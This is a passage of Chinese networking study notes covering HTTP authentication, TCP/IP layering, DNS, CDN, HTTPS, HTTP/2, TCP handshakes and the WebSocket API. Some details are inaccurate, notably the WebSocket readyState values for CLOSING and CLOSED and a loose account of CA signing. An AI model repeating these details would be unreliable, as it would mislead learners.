及密码发送给服务器\r\n- 步骤3：接收到包含首部字段 Authorization 请求的服务器,会对认证信息的正确性进行验证\r\n\r\n### DIGEST 认证\r\n\r\n- DIGEST 认证同样使用质询 / 响应的 方式(challenge/response),但不会像 BASIC 认证那样直接发送明文密码。\r\n- 步骤 1: 请求需认证的资源时,服务器会随着状态码 401 Authorization Required,返 回带 WWW-Authenticate 首部字段的响应\r\n- 步骤 2: 接收到 401 状态码的客户端,返回的响应中包含 DIGEST 认证必须的首部字段 Authorization 信 息。\r\n- 步骤 3: 接收到包含首部字段 Authorization 请求的服务器,会确认认证信息的正确性。\r\n\r\n### SSL 客户端认证\r\n\r\n- SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。\r\n- 步骤 1: 接收到需要认证资源的请求,服务器会发送 Certificate Request 报文,要求客户端提供客户端证 书。\r\n- 步骤 2: 用户选择将发送的客户端证书后,客户端会把客户端证书信息以 Client Certificate 报文方式发送给 服务器。\r\n- 步骤 3: 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥,然后开始 HTTPS 加密通 信。\r\n\r\n###  基于表单认证\r\n\r\n- 认证多半为基于表单认证\r\n- 基于表单认证的标准规范尚未有定论,一般会使用 Cookie 来管理 Session(会话)\r\n- 步骤 1: 客户端把用户 ID 和密码等登录信息放入报文的实体部分,通常是以 POST 方法把请求发送给服务 器。\r\n- 步骤 2: 服务器会发放用以识别用户的 Session ID。会在首部字段 Set-Cookie 内写入 Session ID\r\n- 步骤 3: 客户端接收到从服务器端发来的 Session ID 后,会将其作为 Cookie 保存在本地\r\n\r\n## TCP/IP协议族\r\n\r\n### 是互联网相关的各类协议族的总称\r\n\r\n- 协议就是计算机与网络设备之间互相同通信的规则\r\n- http属于他内部的一个子集\r\n\r\n### 通信传输流\r\n\r\n- 发送端从应用层往下走，接收端从链路层往上走\r\n- 发送端在层与层之间传输数据时，每经过一层必定会被打上一个该层所属的首部信息\r\n- 接收端在层与层之间传输数据时，每经过一层会把对应的首部去掉\r\n- 这种数据信息包装的做法称为封装\r\n\r\n### 负责传输的IP协议\r\n\r\n- 把各种数据包传送给对方（两个重要的条件）\r\n\r\n\t- IP地址（节点被分配的地址）\r\n\t- MAC地址（网卡所属的固定地址）\r\n\r\n### 确保可靠性的TCP协议\r\n\r\n- 提供可靠的字节流服务，把数据准确可靠的传给对方\r\n- 为了方便传输，将大块数据分割成以报文段为单位的数据包进行管理（为了传输大的数据）\r\n- 三次握手\r\n\r\n\t- 客户端发送SYN给服务端，（同步请求）\r\n\t- 服务端发送SYN/ACK（同步请求和确认）\r\n\t- 客户端发送ACK（确认）\r\n\t- 若在某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包\r\n\r\n### DNS域名解析服务\r\n\r\n- 通过域名查找IP地址或逆向从IP查找域名的服务\r\n\r\n### URI与URL\r\n\r\n- URI统一资源标识符，标识资源\r\n- URL统一资源定位符、是URI的子集，标识资源地址\r\n\r\n###  分层管理\r\n\r\n- 链路层\r\n\r\n\t- 用来处理网络连接的硬件部分\r\n\r\n- 传输层\r\n\r\n\t- 为应用层提供网络连接中的两台计算机之间的数据传输\r\n\t- TCP传输控制协议\r\n\t- UDP用户数据报协议\r\n\t- 将应用层的数据进行分割，并在各个报文打上标记序号及端口号后发给网络层\r\n\r\n- 网络层\r\n\r\n\t- 处理在网络上流动的数据包，数据包是网路传输协议的最小数据单位，规定通过怎么的路径到达目的地。\r\n\t- 增加作为通信目的地的MAC地址后转发给链路层\r\n\r\n- 应用层\r\n\r\n\t- 决定了向用户提供的应用服务时通信的活动\r\n\t- FTP文件传输协议\r\n\t- DNS域名系统\r\n\r\n- 分层次的好处\r\n\r\n\t- 应变不同需求\r\n\r\n\t\t- 当需求不同的时候不需要改变所有整体、只需要修改相应的层次就行了。\r\n\r\n\t- 分工明确\r\n\r\n\t\t- 只需要考虑分配给自己的任务\r\n\r\n## 简单HTTP协议\r\n\r\n### 客户端与服务端通讯\r\n\r\n- 在两台计算机之间使用 HTTP 协议通信时,在一条通信线路上必定有一端是客户端,另一端则是服务器端\r\n- 请求必定由客户端发出, 而服务器端回复响应\r\n- 请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的\r\n- 响应报文基本上由协议版本、状态码(表示请求成功或失败的数字代码)、用以解释状态码的原因短语、可 选的响应首部字段以及实体主体构成\r\n\r\n### 请求报文的构成\r\n\r\n- 方法/URI/协议版本\r\n- 请求首部字段\r\n- 内容实体\r\n\r\n### HTTP是不保存状态的协议\r\n\r\n- 协议自身不具备保存之前发送过的请求或相应的功能\r\n- HTTP/1.1虽然无状态协议，但是引入Cookies之后可以管理状态了\r\n- 无状态的优点是可以减少服务器的CPU以及内存资源的消耗\r\n- Cookies技术通过在请求和响应报文中写入Cookies来控制客户端的状态\r\n- 在服务端发送的响应报文内添加Set-Cookies的首部字段信息，通知客户端保存Cookies。当下次客户端发送请求时，客户端会自动在请求报文中加入Cookies值后发送出去\r\n\r\n### 告知服务器意图的HTTP方法\r\n\r\n- GET：获取资源\r\n\r\n\t- 使用GET方法请求访问已被URI识别的资源\r\n\r\n- POST：传输实体的主体\r\n\r\n\t- 虽然GET也可以但是一般不使用GET，POST的主要目的不是获取响应的主体内容\r\n\r\n- PUT：传输文件\r\n\r\n\t- 像FTP协议的文件上传一样，要求在请求的报文 主体中包含文件内容，然后保存到请求URI指定的位置，\r\n\r\n- HEAD：获取报文首部\r\n\r\n\t- 用于确认URI的有效性和资源更新的日期时间等\r\n\t- 和GET一样但是不返回报文主体\r\n\r\n- DELETE删除文件\r\n\r\n\t- 请求删除URI指定的资源\r\n\r\n- OPTIONS：询问支持的方法\r\n\r\n\t- 用来查询针对请求URI指定资源支持的方法\r\n\r\n- TRACE：追踪路径\r\n\r\n\t- 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服 务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最 后接收到请求的服务器端则返回状态码 200 OK 的响应。 \r\n\t- 客户端通过TRACE方法查询发送出去的请求是怎么样被加工修改的。\r\n\t- 请求想要连接到源目标服务器可能会通过代理中转，TRACES方法就是用来确认连接过程中发生的一系列操作\r\n\t- 容易引发XST扩展追踪攻击\r\n\r\n- CONNECT：要求用隧道协议连接代理\r\n\r\n\t- 要求与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信\r\n\t- 主要使用SSL安全套接层和TLS传输安全协议把通信内容加密后经网络隧道传输\r\n\t- CONNECT 代理服务器名：端口号 HTTP版本\r\n\r\n### 持久连接节省通信量\r\n\r\n- HTTP/1.1新增keep-alive方法\r\n- 特点：只要任意一端没有明确提出断开连接，则保持TCP连接状态\r\n- HTTP 协议的初始版本中,每进行一次 HTTP 通信就要断开一次 TCP 连接\r\n- 持久连接的特点是,只要任意 一端没有明确提出断开连接,则保持 TCP 连接状态\r\n- 持久连接使得多数请求以管线化(pipelining)方式发送成为可能\r\n- 减少了TCP连接的重复建立和断开所造成的额外开销，减轻了服务端的负载\r\n- HTTP/1.1中所有的连接默认都是持久连接\r\n\r\n### 使用 Cookie 的状态管理\r\n\r\n- HTTP 是无状态协议,它不对之前发生过的请求和响应的状态进行管理\r\n- Cookie 技术通过在请 求和响应报文中写入 Cookie 信息来控制客户端的状态\r\n- Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息,通知客户端保存 Cookie\r\n- 当下次客户端再往该服务器发送请求时,客户端会自动在请求报文中加入 Cookie 值后发送出去\r\n\r\n### 管线化\r\n\r\n- 持久连接使得多数请求以管线化方式发送成为可能\r\n- 能够做到同时并行发送多个请求，不需要一个接一个地等待响应了\r\n\r\n## WebSocket与HTTP\r\n\r\n### 相同点\r\n\r\n- 基于TCP的可靠传输\r\n- 都是应用层协议\r\n\r\n### 不同点\r\n\r\n- WebSocket\r\n\r\n\t- 双向通信协议，模拟Socket协议\r\n\t- 可以双向发送或接受信息\r\n\r\n- HTTP\r\n\r\n\t- 单向发送信息或接受信息\r\n\t- 浏览器向服务器发起连接\r\n\t- 服务器预先不知道这个连接\r\n\r\n### 联系\r\n\r\n- web Socket建立握手时，数据是通过HTTP传输的\r\n- 建立之后不需要HTTP协议\r\n\r\n### Socket\r\n\r\n- 应用层与TCP/IP协议族通信的中间软件抽象层\r\n- 它是一组接口，提供一套调用TCP/IP协议的API\r\n- Socket是传输控制层接口，WebSocket是应用层协议。\r\n\r\n## DNS原理\r\n\r\n### 递归查询\r\n\r\n- 客户端问本地DNS服务器\r\n- 本地DNS服务器问根域名服务器\r\n- 根域名服务器问顶级域名服务器\r\n- 顶级域名服务器问主域名服务器\r\n\r\n### 迭代查询\r\n\r\n- 客户端询问本地DNS服务器\r\n- 客户端问根域名服务器\r\n- 客户端问顶级域名服务器\r\n- 客户端问主域名服务器\r\n\r\n### 域名系统\r\n\r\n- DNS在进行区域传输的时候使用TCP协议，其它时候则使用UDP协议\r\n\r\n\t- 区域传送时使用TCP\r\n\r\n\t\t- 辅域名服务器会定时（一般时3小时）向主域名服务器进行查询以便了解数据是否有变动\r\n\t\t- 如有变动，则会执行一次区域传送，进行数据同步。区域传送将使用TCP而不是UDP，因为数据同步传送的数据量比一个请求和应答的数据量要多得多。\r\n\r\n\t- 客户端向DNS服务器查询域名，一般返回的内容都不超过512字节，用UDP传输即可\r\n\r\n### 查找顺序\r\n\r\n- 浏览器缓存\r\n\r\n\t- 根据本地DNS服务器的设置，采用递归或者迭代查询，直至解析完成。\r\n\r\n- 系统缓存\r\n\r\n\t- 检查自己本地的hosts文件是否有这个网址映射关系\r\n\r\n-  路由器缓存\r\n\r\n\t- 进入路由器缓存中检查\r\n\r\n- 本地DNS解析器缓存，是否有这个网址映射关系\r\n- 根据本地DNS服务器的设置，采用递归或者迭代查询，直至解析完成。\r\n\r\n## http/http2\r\n\r\n### http1.x缺点\r\n\r\n- 对同一个域名的并发连接最多只能2个，而平均一个页面有40个资源\r\n- 线头阻塞，同一个连接请求，需要一个接一个串行发送和接受\r\n- 请求和响应的头部信息大，无法压缩\r\n- 不能控制响应的优先级\r\n- 只能单项请求\r\n\r\n### http2\r\n\r\n- 传输内容使用二进制协议，在应用层和传输层之间增加了二进制分帧层\r\n- 使用帧作为最小传输单位\r\n\r\n\t- 所有的帧以固定的9个八位字节头部开头，随后是一个可变长的的有效载荷\r\n\r\n- 多路复用\r\n- 服务器推送\r\n- 优先级与依赖性\r\n- 可重置\r\n\r\n\t- RST_STREAM 帧来中断\r\n\r\n- 流量控制\r\n\r\n## HTTP与HTTPS的区别\r\n\r\n### HTTP\r\n\r\n- 运行在TCP上\r\n- 明文传输\r\n- 端口80\r\n- 工作在应用层\r\n\r\n### 证书+数字签名\r\n\r\n- 网站信息加密后通过第三方机构的私钥再次加密生成数字签名\r\n- 数字证书=网站信息+数字签名\r\n- 因为数字签名的存在，会导致客户端验证签名不匹配，这样就防止了中间人替换公钥的问题\r\n- 安全拿到服务器的公钥之后，使用公钥对随机生成的对称密钥进行加密传输给服务器，此后的数据将使用对称加密的方式进行传输\r\n\r\n### 对称加密\r\n\r\n- 加密和解密用同一个密钥的加密方式\r\n- 传输的密钥会被劫持\r\n\r\n### HTTPS\r\n\r\n- CA证书\r\n\r\n\t- 免费证书少\r\n\r\n- SSL/TLS加密\r\n\r\n\t- 加密后运行在TCP上\r\n\r\n- 端口443\r\n- 防止运营商劫持\r\n- 工作在传输层\r\n\r\n### 非对称加密\r\n\r\n- 私钥加密的内容，公钥可以解开\r\n- 公钥加密的内容，只有私钥可以解开\r\n- 私钥存在服务端，公钥发送到客户端，客户端用公钥加密\r\n- 这样的传输方式公钥容易被中间人篡改\r\n\r\n## 面向前端的CDN原理\r\n\r\n### （1）为什么需要CDN\r\n\r\n- 根本上的原因是\r\n\r\n\t- 网站需要提高访问速度，HTTP传输时延对web的访问速度的影响很大，在绝大多数情况下是起决定性作用的，这是由TCP/IP协议的一些特点决定的。物理层上的原因是光速有限、信道有限，协议上的原因有丢包、慢启动、拥塞控制等。\r\n\r\n- 最简单的做法\r\n\r\n\t- 当然就是多设置几个服务器，让终端用户离服务器“更近”。典型的例子是各类下载网站在不同地域不同运营商设置镜像站，或者是像Google那样设置多个数据中心。\r\n\t- 问题\r\n\r\n\t\t- 一是多地部署时的困难\r\n\t\t- 二是一致性没法保障\r\n\t\t- 三则是管理困难、成本很高\r\n\t\t- 实际上，在排除多地容灾等特殊需求的情况下，对大多数公司这种做法是不太可取的。\r\n\r\n- CDN\r\n\r\n\t- CDN是一种公共服务，他本身有很多台位于不同地域、接入不同运营商的服务器，而所谓的使用CDN实质上就是让CDN作为网站的门面，用户访问到的是CDN服务器，而不是直接访问到网站。由于CDN内部对TCP的优化、对静态资源的缓存、预取，加上用户访问CDN时，会被智能地分配到最近的节点，降低大量延迟，让访问速度可以得到很大提升。\r\n\r\n### （2）CDN的原理\r\n\r\n- CDN做了什么？\r\n\r\n\t- CDN做了两件事，一是让用户访问最近的节点，二是从缓存或者源站获取资源\r\n\r\n- 访问 CDN的过程\r\n\r\n\t- 流程图\r\n\r\n\t- 1.首先访问本地的 DNS ，如果没有命中，继续递归或者迭代查找，直到命中拿到对应的 IP 地址。 \r\n\r\n\t\t- 这个过程中，有一个 CNAME 的过程，我们访问 CDN 资源的地址一般是 a.cloud.com 或者类似的地址，是一个公司的访问 CDN 的专用地址。但是我们用的 cdn 的服务却是第三方的，即其实资源在他们的地址上比如 tencent.cdn。这时候就需要在 dns 查询的时候，需要把我们访问 a.cloud.com的地址映射到 tencent.cdn 的地址上，然后拿着映射后的地址再去走一遍 DNS 解析，成功之后才获取到第三方提供的全局负载均衡系统的 IP。再继续走后面的流程。\r\n\r\n\t- 2.拿到对应的 IP 地址之后服务器端发送请求到目的地址。注意这里返回的不直接是 cdn 服务器的 IP 地址，而是全局负载均衡系统的 IP 地址\r\n\t- 4.全局负载均衡系统会根据客户端的 IP地址和请求的 url 和相应的区域负载均衡系统通信\r\n\t- 5.区域负载均衡系统拿着这两个东西获取距离客户端最近且有相应资源的cdn 缓存服务器的地址，返回给全局负载均衡系统 \r\n\t- 6.全局负载均衡系统返回确定的 cdn 缓存服务器的地址给客户端。\r\n\t- 7.客户端请求缓存服务器上的文件\r\n\r\n- 通俗理解\r\n\r\n\t- 其实 CDN就是个放服务端资源的一个仓库。康师傅的泡面如果不是有家门口的小卖部，我们就得去人家的工厂门口拿。有了小卖部，我们只需要去一个卖康师傅或者有货的小卖部拿，就是这个道理。\r\n\r\n- 回源\r\n\r\n\t- 当 CDN 缓存服务器中没有符合客户端要求的资源的时候，缓存服务器会请求上一级缓存服务器，以此类推，直到获取到。最后如果还是没有，就会回到我们自己的服务器去获取资源。 那都有哪些时候会回源呢？没有资源，资源过期，访问的资源是不缓存资源等都会导致回源。\r\n\t- 专业术语\r\n\r\n\t\t- 边缘节点：指距离最终用户接入具有较少的中间环节的网络节点\r\n\r\n### （3）资源的过期如何判定？cdn 是如何更新数据的？\r\n\r\n- 资源过期时间就是根据我们老生常谈的请求头部来判定。\r\n- CDN更新数据分两种，主动（PUSH）和被动（PULL）。被动刚才我们已经提到过了，利用回源就可以被动在途经的 CDN 节点缓存数据。 而主动指的是，我们从服务器主动往 CDN 推送数据。\r\n\r\n## 【HTTPS】HTTPS与HTTP的区别，以及HTTP2\r\n\r\n### HTTP与HTTPS的区别\r\n\r\n- （1）HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。\r\n- （2）HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。\r\n- （3）HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。\r\n- （4）HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题。\r\n\r\n### HTTPS中的对称加密与非对称加密\r\n\r\n- 非对称加密，XX网站生成公钥和私钥，公钥发给别人进行信息传输加密，私钥留在本地进行获取信息解码。公钥用于信息发送，私钥用于信息接收\r\n- 对称加密与非对称加密\r\n\r\n\t- 对称加密就是加密与解密的秘钥是相同的。而非对称加密就是公钥加密的内容，必须用私钥才能解密，私钥加密的内容，必须用公钥才能解密。\r\n\r\n- 加密图解\r\n\r\n- 加密过程\r\n\r\n\t- （1）server生成一个公钥和私钥，把公钥发送给第三方认证机构（CA）；\r\n\t- （2）CA把公钥进行MD5加密，生成数字签名；再把数字签名用CA的私钥进行加密，生成数字证书。CA会把这个数字证书返回给server；\r\n\t- （3）server拿到数字证书之后，就把它传送给浏览器；\r\n\t- （4）浏览器会对数字证书进行验证，首先，浏览器本身会内置CA的公钥，会用这个公钥对数字证书解密，验证是否是受信任的CA生成的数字证书；\r\n\t- （5）验证成功后，浏览器会随机生成对称秘钥，用server的公钥加密这个对称秘钥，再把加密的对称秘钥传送给server；\r\n\t- （6）server收到对称秘钥，会用自己的私钥进行解密，之后，它们之间的通信就用这个对称秘钥进行加密，来维持通信。\r\n\r\n### 谷歌2012年提出SPDY方案\r\n\r\n- SPDY可以说是综合了HTTPS和HTTP两者有点于一体的传输协议，主要解决：\r\n- （1）降低延迟\r\n\r\n\t- 针对HTTP高延迟的问题，SPDY优雅的采取了多路复用（multiplexing）。\r\n\t- 多路复用通过多个请求stream共享一个tcp连接的方式，解决了HOL blocking的问题，降低了延迟同时提高了带宽的利用率。\r\n\r\n- （2）请求优先级\r\n\r\n\t- 多路复用带来一个新的问题是，在连接共享的基础之上有可能会导致关键请求被阻塞。\r\n\t- SPDY允许给每个request设置优先级，这样重要的请求就会优先得到响应。比如浏览器加载首页，首页的html内容应该优先展示，之后才是各种静态资源文件，脚本文件等加载，这样可以保证用户能第一时间看到网页内容。\r\n\r\n- （3）header压缩\r\n\r\n\t- HTTP1.x的header很多时候都是重复多余的。选择合适的压缩算法可以减小包的大小和数量。\r\n\r\n- （4）基于HTTPS的加密协议传输\r\n- （5）服务端推送（server push）\r\n\r\n\t- 采用了SPDY的网页，例如我的网页有一个sytle.css的请求，在客户端收到sytle.css数据的同时，服务端会将sytle.js的文件推送给客户端，当客户端再次尝试获取sytle.js时就可以直接从缓存中获取到，不用再发请求了。\r\n\r\n- SPDY位于HTTP之下，TCP和SSL之上，这样可以轻松兼容老版本的HTTP协议(将HTTP1.x的内容封装成一种新的frame格式)，同时可以使用已有的SSL功能。\r\n\r\n### HTTP2：SPDY的升级版\r\n\r\n- 基于SPDY设计，与其不同之处\r\n\r\n\t- HTTP2.0 支持明文 HTTP 传输，而 SPDY 强制使用 HTTPS\r\n\t- HTTP2.0 消息头的压缩算法采用 HPACK，而非 SPDY 采用的 DEFLATE\r\n\r\n- HTTP2 新特性\r\n\r\n\t- 新的二进制格式（Binary Format）\r\n\r\n\t\t- HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。\r\n\r\n\t- 多路复用（MultiPlexing）\r\n\r\n\t\t- 即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。\r\n\t\t- 原理图\r\n\r\n\t- header压缩\r\n\r\n\t\t- HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。\r\n\r\n\t- 服务端推送（server push）\r\n\r\n## 【TCP、UDP】互联网协议\r\n\r\n### TCP 三次握手和四次挥手\r\n\r\n- 定义\r\n\r\n\t- 三次握手与四次挥手分别对应TCP连接建立过程与断开过程，先上TCP报文格式\r\n\r\n- 字段介绍\r\n\r\n\t- （1）序号\r\n\r\n\t\t- Seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。\r\n\r\n\t- （2）确认序号\r\n\r\n\t\t- Ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，Ack=Seq+1。\r\n\r\n\t- （3）标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等\r\n\r\n\t\t- （A）URG：紧急指针（urgent pointer）有效。\r\n\t\t- （B）ACK：确认序号有效。\r\n\t\t- （C）PSH：接收方应该尽快将这个报文交给应用层。\r\n\t\t- （D）RST：重置连接。\r\n\t\t- （E）SYN：发起一个新连接。\r\n\t\t- （F）FIN：释放一个连接。\r\n\r\n- 三次握手\r\n\r\n\t- 简明理解\r\n\r\n\t\t- 第一次握手：Client什么都不能确认；Server确认了对方发送正常\r\n\t\t- 第二次握手：Client确认了：自己发送、接收正常，对方发送、接收正常；Server确认了：自己接收正常，对方发送正常\r\n\t\t- 第三次握手：Client确认了：自己发送、接收正常，对方发送、接收正常；Server确认了：自己发送、接收正常，对方发送接收正常\r\n\r\n\t- 实际过程\r\n\r\n\t\t- A对B说：我的序号是x，我要向你请求连接；（第一次握手，发送SYN包，然后进入SYN-SEND状态）\r\n\t\t- B听到之后对A说：我收到你的序号x了，我给你返回一个x+1，我的序号是y，期待你下一句序号是y+1的话（意思就是收到了序号为y的话，即ack=y+1），同意建立连接。（第二次握手，发送ACK-SYN包，然后进入SYN-RCVD状态）\r\n\t\t- A听到B说同意建立连接之后，对B说：与确认你同意与我连接（ack=y+1,ACK=1,seq=x+1）。（第三次握手，A已进入ESTABLISHED状态）\r\n\t\t- B听到A的确认之后，也进入ESTABLISHED状态。\r\n\r\n\t- 为什么要有三次握手？\r\n\r\n\t\t- 两次握手的问题\r\n\r\n\t\t\t- 两次握手的问题在于服务器端不知道一个SYN是否是无效的\r\n\t\t\t- 假设只有两次握手，比如图中的1，2步，当A想要建立连接时发送一个SYN，然后等待ACK，结果这个SYN因为网络问题没有及时到达B，所以A在一段时间内没收到ACK后，在发送一个SYN，B也成功收到，然后A也收到ACK，这时A发送的第一个SYN终于到了B，对于B来说这是一个新连接请求，然后B又为这个连接申请资源，返回ACK，然而这个SYN是个无效的请求，A收到这个SYN的ACK后也并不会理会它，而B却不知道，B会一直为这个连接维持着资源，造成资源的浪费\r\n\r\n\t\t- 三次握手可以保证任何一次握手出现问题，都是可以被发现或补救的\r\n\r\n\t\t\t- 因为客户端会给服务器回复第二次握手，也意味着服务器会等待客户端的第三次握手，如果第三次握手迟迟不来，服务器便会认为这个SYN是无效的，释放相关资源。\r\n\r\n\t\t- 一句话：“为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误”\r\n\r\n- 四次挥手\r\n\r\n\t- 实际过程\r\n\r\n\t\t- 1.A与B交谈结束之后，A要结束此次会话，对B说：我要关闭连接了（seq=u,FIN=1）。（第一次挥手，A进入FIN-WAIT-1）\r\n\t\t- 2.B收到A的消息后说：确认，你要关闭连接了。（seq=v,ack=u+1,ACK=1）（第二次挥手，B进入CLOSE-WAIT）\r\n\t\t- 3.A收到B的确认后,等了一段时间，因为B可能还有话要对他说。（此时A进入FIN-WAIT-2）\r\n\t\t- 4.B说完了他要说的话（只是可能还有话说）之后，对A说，我要关闭连接了。（seq=w, ack=u+1,FIN=1，ACK=1）(第三次挥手)\r\n\t\t- 5.A收到B要结束连接的消息后说：已收到你要关闭连接的消息。（seq=u+1,ack=w+1,ACK=1）(第四次挥手，然后A进入CLOSED)\r\n\t\t- 6.B收到A的确认后，也进入CLOSED。\r\n\r\n\t-  为什么要四次挥手？\r\n\r\n\t\t- 根本原因是，一方发送FIN只表示自己发完了所有要发的数据，但还允许对方继续把没发完的数据发过来。\r\n\r\n### TCP、UDP协议区别\r\n\r\n- 1，TCP是面向连接的协议，UDP是无连接协议； \r\n\r\n\t- 对于面向连接的： 两个人打电话时，双方确认并建立连接后才能进行通信。 \r\n\t- 对于面向无连接的：在邮局寄信时，你只需要将信放在邮筒里，不需要给收件人通知，收件人也不知道你给他寄信了\r\n\r\n- 2，TCP无界，UDP有界； \r\n\r\n\t- TCP通过字节流传输，即TCP将应用程序看成是一连串的无结构的字节流。每个TCP套接口有一个发送缓冲区，如果字节流太长时，TCP会将其拆分进行发送。当字节流太短时，TCP会等待缓冲区中的字节流达到一定程度时再构成报文发送出去，TCP发给对方的数据，对方在收到数据时必须给矛确认，只有在收到对方的确认时，本方TCP才会把TCP发送缓冲区中的数据删除。 \r\n\t- 而UDP传输报文的方式是由应用程序控制的，应用层交给UDP多长的报文，UDP照样发送，既不拆分，也不合并，而是保留这些报文的边界，即一次发送一个报文。 \r\n\r\n- 3，TCP可靠，UDP不可靠； \r\n- 4，TCP有序，UDP无序； \r\n\r\n\t- 消息在传输过程中可能会乱序，后发送的消息可能会先到达，TCP会对其进行重排序，UDP不会。\r\n\r\n- 5，TCP有流量控制（以及拥塞处理），UDP没有； \r\n\r\n\t- 流量控制\r\n\r\n\t\t- TCP利用滑动窗口机制在TCP连接上实现对发送方的流量控制， 如果发送方把数据发送得过快，接收方可能会来不及接收，这就会造成数据的丢失。所谓流量控制就是让发送方的发送速率不要太快，要让接收方来得及接收。 \r\n\t\t- 滑动窗口\r\n\r\n\t- 拥塞处理\r\n\r\n\t\t- 防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提：网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。 \r\n\r\n\t- 拥塞处理和流量控制不同，后者是作用于接收方，保证接收方来得及接受数据。而前者是作用于网络，防止过多的数据拥塞网络，避免出现网络负载过大的情况。\r\n\t- 当出现网络抖动时，TCP会自觉降低发送速度，他会努力维护次序，但udp依然保持速度不变\r\n\r\n- 应用场景\r\n\r\n\t- TCP应用场景\r\n\r\n\t\t- 效率要求相对低，但对准确性要求相对高的场景。因为传输中需要对数据确认、重发、排序等操作，相比之下效率没有UDP高。举几个例子：文件传输（准确高要求高、但是速度可以相对慢）、接受邮件、远程登录。\r\n\r\n\t- UDP应用场景\r\n\r\n\t\t- 效率要求相对高，对准确性要求相对低的场景。举几个例子：QQ聊天、在线视频、网络语音电话（即时通讯，速度要求高，但是出现偶尔断续不是太大问题，并且此处完全不可以使用重发机制）、广播通信（广播、多播）。\r\n\r\n## WEBSOCKET \r\n\r\n### （1）基于 HTTP 协议的方案的本质缺陷\r\n\r\n- 在浏览器与服务器通信间，传统的 HTTP 请求在某些场景下并不理想，比如实时聊天、实时性的小游戏等等，其面临主要两个缺点：\r\n\r\n\t- 无法做到消息的「实时性\r\n\t- 服务端无法主动推送信息\r\n\r\n- 其基于 HTTP 的主要解决方案有：\r\n\r\n\t- 基于 ajax 的轮询：客户端定时或者动态相隔短时间内不断向服务端请求接口，询问服务端是否有新信息；其缺点也很明显：多余的空请求（浪费资源）、数据获取有延时；\r\n\t- Long Poll：其采用的是阻塞性的方案，客户端向服务端发起 ajax 请求，服务端挂起该请求不返回数据直到有新的数据，客户端接收到数据之后再次执行 Long Poll；该方案中每个请求都挂起了服务器资源，在大量连接的场景下是不可接受的；\r\n\r\n- 本质缺陷即「被动性」，服务端无法下推消息，仅能由客户端发起请求不断询问是否有新的消息，同时对于客户端与服务端都存在性能消耗。\r\n\r\n### （2）WebSocket 是 HTML5 中提出的新的网络协议标准\r\n\r\n- 初步了解\r\n\r\n\t- WebSocket 是 HTML5 开始提供的一种浏览器与服务器间进行全双工通讯的网络技术。 \r\n\t-  在 WebSocket API 中，浏览器和服务器只需要要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送。\r\n\r\n- 特点\r\n\r\n\t- （1）建立于 TCP 协议之上的应用层；\r\n\t- （2）一旦建立连接（直到断开或者出错），服务端与客户端握手后则一直保持连接状态，是持久化连接；\r\n\t- （3）服务端可通过实时通道主动下发消息；\r\n\t- （4）数据接收的「实时性（相对）」与「时序性」；\r\n\r\n### （3）Websocket实践\r\n\r\n- 浏览器提供原生对象\r\n\r\n\t- 在浏览器中使用 Websocket 非常简单，在支持 Websocket 的浏览器中提供了原生的 WebSocekt 对象，其中对于消息的接收与数据帧处理在浏览器中已经封装好了。\r\n\r\n- 服务端实现\r\n\r\n\t- 使用 Websocket 需要服务端与客户端都提供相应能力，这里基于 Node.js 和 ws 简单建立一个服务端 Websocket 接口：\r\n\r\n\t- （1）在 8080 端口中监听了 express 的请求与 Websocket 请求，因为他们本身协议（http(s):// 与 ws(s)://）不同，因此不会冲突。\r\n\t- （2）同时在代码中可以看到其首先监听了 connection 事件（建立连接触发），在其回调中监听 message 事件（接收到消息）并立即 send 一条数据。\r\n\r\n- 浏览器实现\r\n\r\n\t- Websocket API\r\n\r\n\t\t- 浏览器中提供了原生类 WebSocket ，使用 new 关键字实例化它：\r\n\r\n\t\t\t- new  WebSocket(String url,optional String | [] protocols);\r\n\r\n\t\t- （1）接收两个参数：\r\n\r\n\t\t\t- url 表示需要连接的地址，比如：ws://localhost:8080；\r\n\t\t\t- protocols 可选参数，可以是一个字符串或者一个数组，用来表示子协议，这样做可以让一个服务器实现多种 WebSocket 子协议；\r\n\r\n\t\t- （2）实例化对象提供两个方法：\r\n\r\n\t\t\t- send 接收一个 String|ArrayBuffer|Blob 数据，作为数据发送到服务端；\r\n\t\t\t- close 接收一个（可选）的 code（关闭状态号，默认为 1000） 与一个（可选）的字符串（表示断开原因），客户端主动断开连接；\r\n\r\n\t\t- （3）连接状态：\r\n\r\n\t\t\t- WebSocket 类提供了一些常量表示连接状态：\r\n\r\n\t\t\t\t- WebSocket.CONNECTING 0 连接还没开启；\r\n\t\t\t\t- WebSocket.OPEN 1 连接已开启并准备好进行通信；\r\n\t\t\t\t- WebSocket.CLOSING 3 连接正在关闭的过程中；\r\n\t\t\t\t- WebSocket.CLOSED 4 